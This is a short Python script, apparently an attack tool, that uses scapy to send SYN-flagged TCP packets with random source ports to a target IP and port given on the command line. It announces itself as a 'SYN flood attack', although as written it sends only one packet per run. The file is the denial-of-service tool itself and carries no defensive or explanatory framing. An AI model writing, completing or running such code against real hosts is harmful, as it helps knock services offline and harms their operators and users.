from scapy.all import *
import sys

# attack to a specific target and from specific source ip
def synFloodAttack(target_ip, dest_port):
	ip=IP(dst=target_ip)   
	tcp = TCP(sport=RandShort(), dport=dest_port, flags="S")
	p = ip/tcp
	send(p, count=1, verbose=0)

def attack(target_ip, dest_port):
	synFloodAttack(target_ip, dest_port)
	print("Packet sent")

if __name__ == "__main__":
	# required ip addres and port
	if len(sys.argv) != 3:
		print("few arguments")
		sys.exit(1)
		
	target_ip = sys.argv[1]
	dest_port = int(sys.argv[2])
	
	print("starting SYN flood attack on "+target_ip+":"+str(dest_port))
	attack(target_ip, dest_port)	
